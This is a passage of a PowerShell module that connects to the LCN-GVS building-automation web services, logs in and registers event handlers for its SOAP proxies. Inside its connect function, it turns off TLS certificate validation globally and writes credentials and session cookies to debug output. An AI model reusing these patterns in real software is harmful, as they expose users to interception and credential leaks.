###############################################################
#
# PowerShell Modul: ISSENDORFF.LCNGVS.Commands
#
# Das PowerShell Modul ISSENDORFF.LCNGVS.Commands wurde entwickelt, um ueber die PowerShell
# Kommandos an das LCN - Globale Visualisierungs-System zu senden. Es bietet u.a. die gleichen Funktionalitaeten, wie
# die LCN-GVS-App und verwendet aussschliesslich die WebServices des LCN-GVS. Die
# LCN-GVS-App ist die Visualisierungsoberflaeche fuer iPhone, iPad und iPod Touch fuer das LCN-GVS "Globale
# Visualisierungs-System" der ISSENDORFF KG.
#
# Generiert von: lmissel
# Generiert am: 30.03.2020
# Zuletzt geandert am: 28.06.2021
#
# HelpUri: https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands
#
# Beispiel:
# ---------
# Connect-LCNGVS -Uri "http://access.lcn.de/LCNGVSDemo" -Credential (Microsoft.PowerShell.Security\Get-Credential)
#
# UserName: guest
# Password: lcn
#
###############################################################

# -----------------------------------------------
# Modulevariablen
# -----------------------------------------------
$Script:LCNGVSSession = $null
$Script:LocalizedData = Import-LocalizedData

# -----------------------------------------------
# Private Funktionen, kleine Helferlein, Enums und Konstanten
# -----------------------------------------------
#region Helper

# Enums laden...
$Enums = @( Get-ChildItem -Path $PSScriptRoot\Enumerations\*.ps1 -ErrorAction SilentlyContinue )
Foreach ($import in @($Enums))
{
    try
    {
        . $import.fullname
    }
    catch
    {
        Write-Error -Message "Fehler beim Laden der Datei $($import.fullname): $_"
    }
}

<#
    .SYNOPSIS
        Ruft die WSDL-Datei des WebServices ab.
    .DESCRIPTION
        Ruft die WSDL-Datei des WebServices ab und gibt den Inhalt als String aus.
    .PARAMETER  Uri
        Gibt die URL der WSDL-Datei an.
    .EXAMPLE
        Receive-WSDLFile -Uri "http://access.lcn.de/LCNGVSDemo/WebServices/Authentification1.asmx?wsdl"
#>
function Receive-WSDLFile
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$false,
                  PositionalBinding=$true,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Receive-WSDLFile',
                  ConfirmImpact='Medium')]
    [Alias('WSDL')]
    [OutputType()]
    param(
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [SupportsWildcards()]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [Uri] $Uri
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"
    }
    Process
    {
        try
        {
            $webrequest = [System.Net.HTTPWebRequest]::Create($Uri);
            $webrequest.CookieContainer = $Script:authSvc.CookieContainer
            $webrequest.Method = [Microsoft.PowerShell.Commands.WebRequestMethod]::Get
            $response = $webrequest.GetResponse()
            $responseStream = $response.GetResponseStream()
            $streamReader = New-Object System.IO.Streamreader($responseStream)
            $output = $streamReader.ReadToEnd()
            return $output
        }
        catch [System.Exception]
        {
            Write-Error $_
        }
        finally
        {
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Liefert alle Cmdlets des Modules
    .DESCRIPTION
        Liefert alle Cmdlets des Modules
    .EXAMPLE
        Get-LCNGVSCommandList
#>
function Get-LCNGVSCommandList
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$false,
                  PositionalBinding=$true,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSCommands',
                  ConfirmImpact='Medium')]
    [Alias("Get-LCNGVSCommands")]
    [OutputType()]
    param
    (
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"
    }
    Process
    {
        Get-Command -Module ISSENDORFF.LCNGVS.Commands
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Erstellt eine TableauUri.
    .DESCRIPTION
        Erstellt eine TableauUri anhand des uebergebenen Tableaus.
    .PARAMETER  Tableau
        Gibt das Tableau an, aus dem eine TableauUri erstellt werden soll.
    .EXAMPLE
        New-LCNGVSTableauUri -Tableau $Tableau
#>
function New-LCNGVSTableauUri
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$true,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/New-LCNGVSTableauUri',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType()]
    param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [LCNGVS.Tableau.Tableau] $Tableau
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"
    }
    Process
    {
        if ($PsCmdlet.ShouldProcess($Tableau.TableauGroupName))
        {
            return ($Tableau.TableauGroupName + "\" + $Tableau.TableauInfo.tableauId)
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

function Write-DebugMessage {
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$false,
                  PositionalBinding=$true,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Write-DebugMessage',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType()]
    param(
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $Message
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        $oldDebugPreference = $DebugPreference

        if (-not ($DebugPreference -eq "SilentlyContinue")) {
            $DebugPreference = 'Continue'
        }
    }
    Process
    {
        Write-Debug $Message
    }
    End
    {
        $DebugPreference = $oldDebugPreference

        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

#endregion

# -----------------------------------------------
# Webservice: Authentification1
# -----------------------------------------------
#region Komponente: Authentification

# -----------------------------------------------
# Benutzeran- bzw. Benutzerabmeldung, Benutzerrechte
# -----------------------------------------------

<#
    .SYNOPSIS
        Melden Sie sich an dem LCN-GVS Server an.
    .DESCRIPTION
        Mit diesem Befehl melden Sie sich am LCN-GVS Server an.
    .PARAMETER  Uri
        Die Url des LCN-GVS Servers.
    .PARAMETER  Credential
        Benutzername und Password
    .EXAMPLE
        Connect-LCNGVS -Uri "http://access.lcn.de/LCNGVSDemo" -Credential (Microsoft.PowerShell.Security\Get-Credential)
    .LINK
        Disconnect-LCNGVS
        Disconnect-LCNGVSAsync
        Get-LCNGVSSession
        Get-LCNGVSUserRights
#>
function Connect-LCNGVS # Alias: 'Login-LCNGVSServer'
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$true,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Connect-LCNGVSServer',
                  ConfirmImpact='Medium')]
    [Alias('Login-LCNGVSServer')]
    [OutputType()]
    Param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [Uri] $Uri,

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=1,
                   ParameterSetName='Default')]
		[ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
		[System.Management.Automation.PSCredential]
		[System.Management.Automation.Credential()]
		$Credential,

        [Parameter(Mandatory=$false,
                   ValueFromPipelineByPropertyName=$true,
                   Position=2,
                   ParameterSetName='Default')]
        [bool] $CreatePersistentCookie = $true,

        [Parameter(Mandatory=$false,
                   ValueFromPipelineByPropertyName=$true,
                   Position=3,
                   ParameterSetName='Default')]
        [int] $TimeoutSec = 5
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Laden von Assemblys aus dem globalen Assemblycache (veraltete Methode)
        [void][System.Reflection.Assembly]::LoadWithPartialName("System.Exception")

        # Bricht die Ausfuehrung ab, wenn ein Fehler auftritt
        $ErrorActionPreference = "Stop"
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Authentification", ($Script:LocalizedData.ConnectLCNGVS -f $Credential.UserName)))
        {
            # ServerCertificateValidationCallback
            [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { return $true }

            try
            {
                # Alte Sitzung zwischenspeichern
                if ($Script:LCNGVSSession) { $oldSession = $Script:LCNGVSSession }

                #region Check Uri
                try
                {
                    $result = Invoke-WebRequest -Uri $Uri -Method Head -TimeoutSec $TimeoutSec -ErrorAction $ErrorActionPreference
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    if ($result.StatusCode -ne 200)
                    {
                        Write-Error -Message "Host not found."
                    }
                    else
                    {
                        Write-DebugMessage -Message "[$($MyInvocation.MyCommand.Name)] Host $Uri found."
                    }
                }
                #endregion

                #region WebServiceProxies

                # Kotrolliert, ob bereits eine Verbindung zum Webservice "Authentification1" vorliegt.
                if ( -not ($Script:authSvc))
                {
                    #region Authentification1

                    # WebService Authentification1
                    Write-Verbose "Step 1 - Benutzer wird angemeldet..."

                    [Uri] $UriAuthentification1 = $Uri.AbsoluteUri + "/WebServices/Authentification1.asmx?wsdl" # Uri erstellen
                    $Script:authSvc = New-WebServiceProxy -Uri $UriAuthentification1 -Namespace "LCNGVS.Authentification" # WebProxy erstellen
                    $Script:authSvc.CookieContainer = New-Object System.Net.CookieContainer # Cookies zwischenspeichern
                    $Script:LCNGVSSession = $Script:authSvc.Login($Credential.UserName, $Credential.GetNetworkCredential().Password, $CreatePersistentCookie) # Anmeldung

                    Write-DebugMessage "[$($MyInvocation.MyCommand.Name)] Credentials: $($Credential | Out-String)"
                    Write-DebugMessage "[$($MyInvocation.MyCommand.Name)] Cookies: $($Script:authSvc.CookieContainer.GetCookies("http://192.168.178.32") | Out-String)"

                    # EventHandler erzeugen
                    Write-Verbose "Step 2 - Registriere Ereignishandler in der PowerShell..."
                    Register-ObjectEvent -InputObject $Script:authSvc -EventName "LoginCompleted" -Action {
                        (New-Event -SourceIdentifier "LoginCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:authSvc -EventName "LoginSecureBeginCompleted" -Action {
                        (New-Event -SourceIdentifier "LoginSecureBeginCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:authSvc -EventName "LoginSecureEndCompleted" -Action {
                        (New-Event -SourceIdentifier "LoginSecureEndCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:authSvc -EventName "LogoutCompleted" -Action {
                        (New-Event -SourceIdentifier "LogoutCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:authSvc -EventName "GetServerInfoCompleted" -Action {
                        (New-Event -SourceIdentifier "GetServerInfoCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:authSvc -EventName "SetUserCustomDataCompleted" -Action {
                        (New-Event -SourceIdentifier "SetUserCustomDataCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    # Gibt die Variable $LCNGVSSession aus.
                    Write-DebugMessage -Message "[$($MyInvocation.MyCommand.Name)] LCNGVSSession: $($Script:LCNGVSSession | Out-String)"

                    #endregion

                    # Prueft, ob der Benutzer angemeldet ist.
                    if ($Script:LCNGVSSession.isSuccess)
                    {
                        #region Logs1

                        if ( -not ($Script:Logs1Svc))
                        {
                            # WSDL herunterladen...
                            Write-Verbose "Step 3 - Verbindung zum WebService Log1 wird hergestellt..."
                            [Uri] $UriLogs1 = $Uri.AbsoluteUri + "/WebServices/Logs1.asmx?wsdl"
                            $output = Receive-WSDLFile -Uri $UriLogs1
                            $output | Set-Content -Path "$env:TEMP\Logs1.wsdl"
                            $Script:Logs1Svc = New-WebServiceProxy -Uri "$env:TEMP\Logs1.wsdl" -Namespace "LCNGVS.Logs"
                            $Script:Logs1Svc.CookieContainer = $Script:authSvc.CookieContainer

                            # EventHandler erzeugen
                            Write-Verbose "Step 4 - Registriere Ereignishandler in der PowerShell..."
                            Register-ObjectEvent -InputObject $Script:Logs1Svc -EventName "GetLogLcnGvsCompleted" -Action {
                                (New-Event -SourceIdentifier "GetLogLcnGvsCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:Logs1Svc -EventName "GetLogLcnServerCompleted" -Action {
                                (New-Event -SourceIdentifier "GetLogLcnServerCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:Logs1Svc -EventName "GetLogAccessControlCompleted" -Action {
                                (New-Event -SourceIdentifier "GetLogAccessControlCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:Logs1Svc -EventName "GetLogMonitoringServerCompleted" -Action {
                                (New-Event -SourceIdentifier "GetLogMonitoringServerCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:Logs1Svc -EventName "GetLogTimerCompleted" -Action {
                                (New-Event -SourceIdentifier "GetLogTimerCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:Logs1Svc -EventName "GetLogMacroServerCompleted" -Action {
                                (New-Event -SourceIdentifier "GetLogMacroServerCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null
                        }

                        #endregion

                        #region Status1

                        if ( -not ($Script:Status1Svc))
                        {
                            # WSDL herunterladen...
                            Write-Verbose "Step 5 - Verbindung zum WebService Service1 wird hergestellt..."
                            [Uri] $UriStatus1 = $Uri.AbsoluteUri + "/WebServices/Status1.asmx?wsdl"
                            $output = Receive-WSDLFile -Uri $UriStatus1
                            $output | Set-Content -Path "$env:TEMP\Status1.wsdl"
                            $Script:Status1Svc = New-WebServiceProxy -Uri "$env:TEMP\Status1.wsdl" -Namespace "LCNGVS.Status"
                            $Script:Status1Svc.CookieContainer = $Script:authSvc.CookieContainer

                            # EventHandler erzeugen
                            Write-Verbose "Step 6 - Registriere Ereignishandler in der PowerShell..."
                            Register-ObjectEvent -InputObject $Script:Status1Svc -EventName "GetStatusCompleted" -Action {
                                (New-Event -SourceIdentifier "GetStatusCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null
                        }

                        #endregion

                        #region MacroServer1

                        if ( -not ($Script:MacroServer1Svc))
                        {
                            # WSDL herunterladen...
                            Write-Verbose "Step 7 - Verbindung zum WebService MacroService1 wird hergestellt..."
                            [Uri] $UriMacroServer1 = $Uri.AbsoluteUri + "/WebServices/MacroServer1.asmx?wsdl"
                            $output = Receive-WSDLFile -Uri $UriMacroServer1
                            $output | Set-Content -Path "$env:TEMP\MacroServer1.wsdl"
                            $Script:MacroServer1Svc = New-WebServiceProxy -Uri "$env:TEMP\MacroServer1.wsdl" -Namespace "LCNGVS.MacroServer"
                            $Script:MacroServer1Svc.CookieContainer = $Script:authSvc.CookieContainer

                            # EventHandler erzeugen
                            Write-Verbose "Step 8 - Registriere Ereignishandler in der PowerShell..."
                            Register-ObjectEvent -InputObject $Script:MacroServer1Svc -EventName "IsEnabledCompleted" -Action {
                                (New-Event -SourceIdentifier "IsEnabledCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:MacroServer1Svc -EventName "SetEnabledCompleted" -Action {
                                (New-Event -SourceIdentifier "SetEnabledCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:MacroServer1Svc -EventName "GetMacrosCompleted" -Action {
                                (New-Event -SourceIdentifier "GetMacrosCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:MacroServer1Svc -EventName "ExecuteMacroCompleted" -Action {
                                (New-Event -SourceIdentifier "ExecuteMacroCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null
                        }

                        #endregion

                        #region MonitoringServer1

                        if ( -not ($Script:MonitoringServer1Svc))
                        {
                            # WSDL herunterladen...
                            Write-Verbose "Step 9 - Verbindung zum WebService MonitoringServer1 wird hergestellt..."
                            [Uri] $UriMonitoringServer1 = $Uri.AbsoluteUri + "/WebServices/MonitoringServer1.asmx?wsdl"
                            $output = Receive-WSDLFile -Uri $UriMonitoringServer1
                            $output | Set-Content -Path "$env:TEMP\MonitoringServer1.wsdl"
                            $Script:MonitoringServer1Svc = New-WebServiceProxy -Uri "$env:TEMP\MonitoringServer1.wsdl" -Namespace "LCNGVS.MonitoringServer"
                            $Script:MonitoringServer1Svc.CookieContainer = $Script:authSvc.CookieContainer

                            # EventHandler erzeugen
                            Write-Verbose "Step 10 - Registriere Ereignishandler in der PowerShell..."
                            Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "IsEnabledCompleted" -Action {
                                (New-Event -SourceIdentifier "IsEnabledCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "SetEnabledCompleted" -Action {
                                (New-Event -SourceIdentifier "SetEnabledCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "RegisterOrReplaceDeviceCompleted" -Action {
                                (New-Event -SourceIdentifier "RegisterOrReplaceDeviceCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "DeregisterDeviceCompleted" -Action {
                                (New-Event -SourceIdentifier "DeregisterDeviceCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "GetRegisteredDeviceCompleted" -Action {
                                (New-Event -SourceIdentifier "GetRegisteredDeviceCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "GetRegisteredServerCompleted" -Action {
                                (New-Event -SourceIdentifier "GetRegisteredServerCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "RegisterForMonitoringEventPushNotificationsCompleted" -Action {
                                (New-Event -SourceIdentifier "RegisterForMonitoringEventPushNotificationsCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "DeregisterFromMonitoringEventPushNotificationsCompleted" -Action {
                                (New-Event -SourceIdentifier "DeregisterFromMonitoringEventPushNotificationsCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "GetPendingNotificationsCompleted" -Action {
                                (New-Event -SourceIdentifier "GetPendingNotificationsCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "RemovePendingNotificationsCompleted" -Action {
                                (New-Event -SourceIdentifier "RemovePendingNotificationsCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "IsReadPendingNotificationsCompleted" -Action {
                                (New-Event -SourceIdentifier "IsReadPendingNotificationsCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "GetMonitoringActionsCompleted" -Action {
                                (New-Event -SourceIdentifier "GetMonitoringActionsCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "AddOrReplaceMonitoringActionCompleted" -Action {
                                (New-Event -SourceIdentifier "AddOrReplaceMonitoringActionCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "DeleteMonitoringActionCompleted" -Action {
                                (New-Event -SourceIdentifier "DeleteMonitoringActionCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "GetMonitoringEventsCompleted" -Action {
                                (New-Event -SourceIdentifier "GetMonitoringEventsCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "AddOrReplaceMonitoringEventCompleted" -Action {
                                (New-Event -SourceIdentifier "AddOrReplaceMonitoringEventCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "DeleteMonitoringEventCompleted" -Action {
                                (New-Event -SourceIdentifier "DeleteMonitoringEventCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null
                        }

                        #endregion

                        #region Tableau1

                        if ( -not ($Script:Tableau1Svc))
                        {
                            # WSDL herunterladen...
                            Write-Verbose "Step 11 - Verbindung zum WebService Tableau1 wird hergestellt..."
                            [Uri] $UriTableau1 = $Uri.AbsoluteUri + "/WebServices/Tableau1.asmx?wsdl"
                            $output = Receive-WSDLFile -Uri $UriTableau1
                            $output | Set-Content -Path "$env:TEMP\Tableau1.wsdl"
                            $Script:Tableau1Svc = New-WebServiceProxy -Uri "$env:TEMP\Tableau1.wsdl" -Namespace "LCNGVS.Tableau"
                            $Script:Tableau1Svc.CookieContainer = $Script:authSvc.CookieContainer

                            Write-Verbose "Step 12 - Registriere Ereignishandler in der PowerShell..."
                            Register-ObjectEvent -InputObject $Script:Tableau1Svc -EventName "GetTableausCompleted" -Action {
                                (New-Event -SourceIdentifier "GetTableausCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:Tableau1Svc -EventName "OpenTableauCompleted" -Action {
                                (New-Event -SourceIdentifier "OpenTableauCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:Tableau1Svc -EventName "CloseTableauCompleted" -Action {
                                (New-Event -SourceIdentifier "CloseTableauCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:Tableau1Svc -EventName "GetImagesCompleted" -Action {
                                (New-Event -SourceIdentifier "GetImagesCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:Tableau1Svc -EventName "PollUpdatesCompleted" -Action {
                                (New-Event -SourceIdentifier "PollUpdatesCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:Tableau1Svc -EventName "SubmitButtonCompleted" -Action {
                                (New-Event -SourceIdentifier "SubmitButtonCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:Tableau1Svc -EventName "SubmitDimmerCompleted" -Action {
                                (New-Event -SourceIdentifier "SubmitDimmerCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:Tableau1Svc -EventName "GetSupportedTrendLogSourcesCompleted" -Action {
                                (New-Event -SourceIdentifier "GetSupportedTrendLogSourcesCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:Tableau1Svc -EventName "GetTrendLogsCompleted" -Action {
                                (New-Event -SourceIdentifier "GetTrendLogsCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:Tableau1Svc -EventName "CloseTrendLogCompleted" -Action {
                                (New-Event -SourceIdentifier "CloseTrendLogCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:Tableau1Svc -EventName "OpenTrendLogCompleted" -Action {
                                (New-Event -SourceIdentifier "OpenTrendLogCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:Tableau1Svc -EventName "GetTrendLogValuesCompleted" -Action {
                                (New-Event -SourceIdentifier "GetTrendLogValuesCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:Tableau1Svc -EventName "GetTrendLogValuesMultipleCompleted" -Action {
                                (New-Event -SourceIdentifier "GetTrendLogValuesMultipleCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null
                        }

                        #endregion

                        #region Timer1

                        if ( -not ($Script:Timer1Svc))
                        {
                            # WSDL herunterladen...
                            Write-Verbose "Step 13 - Verbindung zum WebService Timer1 wird hergestellt..."
                            [Uri] $UriTimer1 = $Uri.AbsoluteUri + "/WebServices/Timer1.asmx?wsdl"
                            $output = Receive-WSDLFile -Uri $UriTimer1
                            $output | Set-Content -Path "$env:TEMP\Timer1.wsdl"
                            $Script:Timer1Svc = New-WebServiceProxy -Uri "$env:TEMP\Timer1.wsdl" -Namespace "LCNGVS.Timer"
                            $Script:Timer1Svc.CookieContainer = $Script:authSvc.CookieContainer

                            # EventHandler erzeugen
                            Write-Verbose "Step 14 - Registriere Ereignishandler in der PowerShell..."
                            Register-ObjectEvent -InputObject $Script:Timer1Svc -EventName "IsEnabledCompleted" -Action {
                                (New-Event -SourceIdentifier "IsEnabledCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:Timer1Svc -EventName "SetEnabledCompleted" -Action {
                                (New-Event -SourceIdentifier "SetEnabledCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:Timer1Svc -EventName "GetTimerEventsCompleted" -Action {
                                (New-Event -SourceIdentifier "GetTimerEventsCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:Timer1Svc -EventName "AddOrReplaceTimerCompleted" -Action {
                                (New-Event -SourceIdentifier "AddOrReplaceTimerCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:Timer1Svc -EventName "DeleteTimerCompleted" -Action {
                                (New-Event -SourceIdentifier "DeleteTimerCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null
                        }

                        #endregion

                        #region AppSiri

                        if ( -not ($Script:AppSiriSvc))
                        {
                            # WSDL herunterladen...
                            Write-Verbose "Step 15 - Verbindung zum WebService AppSiri wird hergestellt..."
                            [Uri] $UriAppSiri = $Uri.AbsoluteUri + "/WebServices/AppSiri.asmx?wsdl"
                            $output = Receive-WSDLFile -Uri $UriAppSiri
                            $output | Set-Content -Path "$env:TEMP\AppSiri.wsdl"
                            $Script:AppSiriSvc = New-WebServiceProxy -Uri "$env:TEMP\AppSiri.wsdl" -Namespace "LCNGVS.AppSiri"
                            $Script:AppSiriSvc.CookieContainer = $Script:authSvc.CookieContainer

                            # EventHandler erzeugen
                            Write-Verbose "Step 16 - Registriere Ereignishandler in der PowerShell..."
                            Register-ObjectEvent -InputObject $Script:AppSiriSvc -EventName "LoaddicCompleted" -Action {
                                (New-Event -SourceIdentifier "LoaddicCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:AppSiriSvc -EventName "CommandExecuteCompleted" -Action {
                                (New-Event -SourceIdentifier "CommandExecuteCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:AppSiriSvc -EventName "dimmingCommandCompleted" -Action {
